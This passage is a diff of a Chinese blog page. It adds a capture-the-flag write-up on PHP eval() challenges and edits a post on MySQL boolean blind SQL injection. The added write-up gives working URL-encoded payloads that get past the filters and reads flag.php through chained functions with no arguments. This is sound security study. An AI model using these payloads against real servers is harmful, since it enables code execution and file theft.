@@ -165,6 +165,190 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/01/31/Guojingning/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/31/Guojingning/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-31 00:10:33" itemprop="dateCreated datePublished" datetime="2021-01-31T00:10:33+08:00">2021-01-31</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <hr>
+<h2 id="title-几道关于无参数的题"><a href="#title-几道关于无参数的题" class="headerlink" title="title :几道关于无参数的题"></a>title :几道关于无参数的题</h2><h3 id="Guojingning"><a href="#Guojingning" class="headerlink" title="Guojingning"></a>Guojingning</h3><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>查看源码中第一个过滤中还可以利用的字符，发现<code>~</code>，和<code>()</code>都没有被过滤，想到可以利用取反</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\5.png" alt="5"></p>
+<p>但是由于第二个过滤，<code>\</code>表示将下一个字符标记符、或一个向后引用、或一个八进制转义符。例如，”\n”匹配\n。”\n”匹配换行符。即相当于多种编程语言中都有的”转义字符”的概念。所以这道题中的<code>\(\)</code>表示匹配<code>(</code>和<code>)</code>。</p>
+<p><code>\s</code>表示出现空白就匹配，<code>^</code>匹配输入字行首，<code>?</code>匹配前面的字表达式零次或一次。</p>
+<p>[a-z]    匹配所有的小写字母</p>
+<p>[A-Z]    匹配所有的大写字母</p>
+<p>[a-zA-Z]   匹配所有的字母</p>
+<p>[0-9]               匹配所以的数字，句子和减号</p>
+<p>因为<code>[^,]</code>匹配除了逗号之外的任何字符，所以<code>[^\s\(\)]</code>是匹配除了空格，（ 和 ）以外的所有字符。</p>
+<p>（?R)是引用当前表达式的意思，例如\w+((?R)?)，可以用\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\w+(\w+((?R)?))、\w+(\w+(\w+((?R)?)))、等等。(?R)? 这里多一个?表示可以有引用，也可以没有。所以在这道题中<code>?\((?R)?\)/</code>, <code>\(</code>表示匹配(，<code>\)</code>表示匹配），第二个过滤表示匹配到函数就会被替换为空，最后只剩下<code>;</code>就可以执行eval语句。</p>
+<p>根据给出的提示，php二维数组能够构造字符串</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\6.png" alt="6"></p>
+<p>首先构造读取当前目录的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line"></span><br><span class="line">[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\7.png" alt="7"></p>
+<p>发现该目录上不存在flag文件，读取上一层目录文件看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">?code&#x3D;[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%9B%96%8D%91%9E%92%9A][!%FF]([~%98%9A%8B%9C%88%9B][!%FF]())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\8.png" alt="8"></p>
+<p>发现也不存在flag文件，读取当前所在的目录名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(dirname(getcwd()));</span><br><span class="line"></span><br><span class="line">?code&#x3D;[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%9B%96%8D%91%9E%92%9A][!%FF]([~%98%9A%8B%9C%88%9B][!%FF]()));</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\9.png" alt="9"></p>
+<p>我们知道<code>var/www/html</code>是Apache的默认路径，源码保存在<code>var/www/index.php</code>中，在<code>var/www</code>目录下没有找到flag，在<code>var</code>目录下也没有flag。</p>
+<h4 id="一些函数的用法："><a href="#一些函数的用法：" class="headerlink" title="一些函数的用法："></a>一些函数的用法：</h4><p><strong>scandir()</strong>    列出目录中的文件和目录<br>用法：scandir(directory,sorting_order,context);<br>directory                必需，规定要扫描的目录<br>sorting_order            可选，默认是0，表示按字母升序排列；设置为1，表示按字母降序排列</p>
+<p>context              可选。<em>context</em> 是可修改目录流的行为的一套选项。</p>
+<p>当传入的参数是(‘.’)时，也就是scandir(‘.’),可以读取当前目录中的文件和目录，同理，当传入（../)时，可以读取上一层目录中的文件和目录。</p>
+<p><strong>localeconv()函数</strong>    函数返回一包含本地数字及货币格式信息的数组。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\10.png" alt="10"></p>
+<p>可以看到第一个元素为点，我们可以使用pos()，current()构造出这个点。</p>
+<p>所以<code>var_dump(scandir(pos(localeconv())));</code>读取当前目录中的目录和文件。</p>
+<p><strong>dirname()函数</strong>，返回路径中的目录部分。</p>
+<p>语法：dirname(path)</p>
+<p>path参数是一个包含了指向一个文件的全路径的字符串。该函数返回去掉最后一个文件或目录后的目录名。</p>
+<p><strong>getcwd()函数</strong>   获取当前工作目录。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\11.png" alt="11"></p>
+<p>所以<code>var_dump(scandir(dirname(getcwd())));</code>可以读取上一个目录中的目录和文件名。</p>
+<p>尝试使用<code>scandir(../../)</code>返回上上层目录文件和文件名。                                                      </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回当前目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\12.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回上一级目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\13.png" alt="13"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回上上级目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\14.png" alt="14"></p>
+<p>根据php二维数组能够构造字符串，构造payload</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\15.png" alt="15"></p>
+<p>构造payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%D1%D1%D0][!%FF]));</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\Desktop\pithur\16.png" alt="16"></p>
+<p>发现在没有过滤的条件下可以执行。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\17.png" alt="17"></p>
+<p>也可以绕过第一个过滤。</p>
+<p>但是第二个过滤不能绕过，仔细分析第二个过滤，发现这就是一个无参数RCE的绕过！！！(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）scandir函数传入了参数，所以不能通过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(pos(localeconv())))  &#x2F;&#x2F;可以使用</span><br><span class="line">var_dump(scandir(&#39;.&#39;))  &#x2F;&#x2F;不能使用</span><br></pre></td></tr></table></figure>
+
+<p>顺便把海啸杯的无参数RCE复习一下</p>
+<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>\w等价于[A-Za-z0-9]</p>
+<p>第一个过滤可以看出只能传入无参数RCE，</p>
+<p>首先构造读取当前目录文件，</p>
+<p>因为scandir()函数没有被过滤，想到可以利用scandir(‘.’)函数读取文件目录，但是scandir(‘.’)函数不满足无参数RCE的形式，所以我们需要构造这个点。</p>
+<p>利用localeconv() 取点，localeconv() 会返回当地的金融信息的数组，而第一个元素即为点，构造方法只需取第一个元素即可 pos()、current() 均可。</p>
+<p>又因为pos被过滤，所以使用current函数来构造点，所以使用<code>scandir(current(localconv()))</code>来构造点。</p>
+<p>常用PHP输出函数有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;<span class="comment">//只能打印字符串</span></span><br><span class="line">print_r(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//能够打印数组和字符串</span></span><br><span class="line">var_dump(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//能够打印数组和字符串同时输出打印内容的数据类型</span></span><br><span class="line">var_export(<span class="string">&quot;hello world!&quot;</span>,<span class="literal">true</span>);<span class="comment">//能够将字符串转换为php代码，第二个参数设置为true能够返回值</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//结束程序并打印内容</span></span><br><span class="line"><span class="keyword">print</span>()函数输出一个或多个字符串。</span><br><span class="line">printf()函数，输出格式化的字符串</span><br><span class="line">sprintf()函数，把百分号（%）符号替换成一个作为参数进行传递的变量</span><br></pre></td></tr></table></figure>
+
+<p>因为输出scandir(‘.’)的内容为数组，所以我们需要寻找可以打印数组的字符串。</p>
+<p>发现有print_r，var_dump都可以打印数组，但是在这道题中，print_r和var_dump都被过滤了</p>
+<p>到这里就没有思路了，看wp发现可以利用file_get_contents函数</p>
+<p><code>file_get_contents()函数</code></p>
+<p>把整个文件读入一个字符串中，和file()一样，不同的是file_get_contents()把文件读入一个字符串。</p>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个函数可以打开文件，输入的文件名为字符串的形式。我们本来想要找的是一个打印数组的函数，那这个file_get_contents函数可以怎么利用？</p>
+<p>到这里还不是很能理解，先利用这道题没有对大小写字母进行严格的过滤进行操作，这道题目过滤了var，我们可以把其中一个字母该为大写，例如Var_dump，vArdump，vaRdump来操作。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\18.png" alt="18"></p>
+<p>可以看到当前目录下存在flag.php，但是该文件存在于目录的中间位置。开始的想法是打乱数组，找到了一个shuffle()函数，该函数随机排列数组单元的顺序（将数组打乱）并为数组中的单元赋予新的键名，删除原有的键名。</p>
+<p>若成功，则返回ture，否则返回false。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">1</span>, <span class="string">&quot;b&quot;</span>=&gt;<span class="number">2</span>, <span class="string">&quot;c&quot;</span>=&gt;<span class="number">3</span>, <span class="string">&quot;d&quot;</span>=&gt;<span class="number">4</span>, <span class="string">&quot;e&quot;</span>=&gt;<span class="number">5</span>);</span><br><span class="line">shuffle($arr);  <span class="comment">//打乱数组</span></span><br><span class="line">print_r($arr);  <span class="comment">//输出Array([0] =&gt; 5 [1] =&gt; 2 [2] =&gt; 1 [3] =&gt; 4 [4] =&gt; 3)</span></span><br><span class="line">print_r(shuffle($arr));<span class="comment">//输出1  （true）</span></span><br><span class="line">shuffle(<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">111</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="number">222</span>));<span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出，这个函数并不适合无参数rce。</p>
+<p>找到另外一个随机函数，array_rand()函数。</p>
+<p><code>array_rand()函数</code></p>
+<p>返回数组中的随机键名，从数组中随机选出一个或多个元素，并返回。</p>
+<p>第二个参数用来确定要选出几个元素。如果规定函数返回不只一个键名，则返回包含随机键名的数组。函数从数组中随机选出一个或多个元素，并返回。</p>
+<p>array_rand(array,number)</p>
+<p>可以看出，返回一个键名符合无参数rce的要求。</p>
+<p>但是，这个函数返回的是键名，而键值“flag.php”才是我们的目的，想到了反转数组，可以利用array_flip()函数。</p>
+<p><code>array_flip()函数</code></p>
+<p>反转数组中所有的键以及它们关联的值。</p>
+<p>这样，我们就可以通过反转数组和array_rand()函数得到我们想要的flag.php字段。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\19.png" alt="19"></p>
+<p>先通过反转数组，再通过array_rand()函数返回数组中的随机键值，当输出flag.php时即为我们想要得到的内容。</p>
+<p>我们可以看出，当输出flag.php是以字符串的形式输出的。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\20.png" alt="20"></p>
+<p>到这里我们就可以联想到file_get_contents函数的用法，我们可以使用file_get_contents(flag.php)来读取flag.php的内容。通过返回的页面为空白和no我们测试，空白的原因是因为输出的文件是没有内容的，输出no的原因通过观察源码我们可以得到，是因为输出的文件内容里含有flag字符。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\21.png" alt="21"></p>
+<p>可以想到利用编码来绕过这个过滤，第一个想到的是base64编码，但是base被过滤，因为过滤不严格，可以用大写字母绕过，解码可得flag。</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\22.png" alt="22"></p>
+<p>当过滤严格，不能使用大写绕过时，可以用bin2hex编码</p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\23.png" alt="23"></p>
+<p><img src="C:\Users\Administrator\Desktop\pithur\24.png" alt="24"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/01/30/cat/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -179,7 +363,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/30/cat/" class="post-title-link" itemprop="url">无判断字符,无报错的bool盲注</a>
+            <a href="/2021/01/30/cat/" class="post-title-link" itemprop="url">无判断字符，基于运行时错误的bool盲注</a>
         </h2>
 
         <div class="post-meta">
@@ -196,7 +380,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-31 00:09:30" itemprop="dateModified" datetime="2021-01-31T00:09:30+08:00">2021-01-31</time>
+                <time title="修改时间：2021-02-01 14:53:50" itemprop="dateModified" datetime="2021-02-01T14:53:50+08:00">2021-02-01</time>
               </span>
 
           <br>
@@ -212,7 +396,7 @@
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>13 分钟</span>
+              <span>14 分钟</span>
             </span>
 
         </div>
@@ -237,12 +421,12 @@
 <h2 id="regexp函数和binary函数"><a href="#regexp函数和binary函数" class="headerlink" title="regexp函数和binary函数"></a>regexp函数和binary函数</h2><p>regexp函数可以匹配正则表达式，而且regexp后面接的内容只要是前面mysql查询结果其中的一部分，就会返回1，否则返回0.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag from flag;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;^flag&#123;f&#39;;</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;^flag&#123;f&#39; |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|                                       1 |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;lag&#39;;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;lag&#39; |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;&#123;&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;&#123;&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;lf&#39;;</span><br><span class="line">+------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;lf&#39; |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure>
 
-<p>binary函数将值转换成二进制字符串， SELECT BINARY “ABC”=”abc”，这里的MySQL执行的字符逐字符比较  “HELLO”和  “hello”并返回0（因为在字符逐字符的基础上，它们是不等价的）</p>
-<p> SELECT “ABC”=”abc”，这里的MySQL执行的字符逐字符比较  “HELLO”和  “hello”并返回1（因为在字符逐字符的基础上，它们是等效的）</p>
+<p>binary函数将值转换成二进制字符串， SELECT BINARY “ABC”=”abc”，这里的MySQL执行的字符逐字符比较  “ABC”和  “abc”并返回0（因为在字符逐字符的基础上，它们是不等价的）</p>
+<p> SELECT “ABC”=”abc”，这里的MySQL执行的字符逐字符比较  “ABC”和  “abc”并返回1（因为在字符逐字符的基础上，它们是等效的）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT BINARY &quot;123abc&quot;;</span><br><span class="line">+-----------------+</span><br><span class="line">| BINARY &quot;123abc&quot; |</span><br><span class="line">+-----------------+</span><br><span class="line">| 123abc          |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT BINARY &quot;ABC&quot;&#x3D;&quot;abc&quot;;</span><br><span class="line">+--------------------+</span><br><span class="line">| BINARY &quot;ABC&quot;&#x3D;&quot;abc&quot; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &quot;ABC&quot;&#x3D;&quot;abc&quot;;</span><br><span class="line">+-------------+</span><br><span class="line">| &quot;ABC&quot;&#x3D;&quot;abc&quot; |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure>
 
-<p>两个函数结合起来，跟regexp函数一样是相同的用法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag from flag;</span><br><span class="line">+--------------+</span><br><span class="line">| flag         |</span><br><span class="line">+--------------+</span><br><span class="line">| flag is here |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary 1;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary 1 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">|                                      0 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39;flag &#39;;</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39;flag &#39; |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">|                                            1 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39; &#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39; &#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure>
+<p>两个函数结合起来，跟regexp函数基本一样，但有些许不同，regexp后面接的是大写（查询结果是小写）也可以成功返回1，而regexp binary 不可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag from flag;</span><br><span class="line">+--------------+</span><br><span class="line">| flag         |</span><br><span class="line">+--------------+</span><br><span class="line">| flag is here |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary 1;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary 1 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">|                                      0 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39; &#39;;</span><br><span 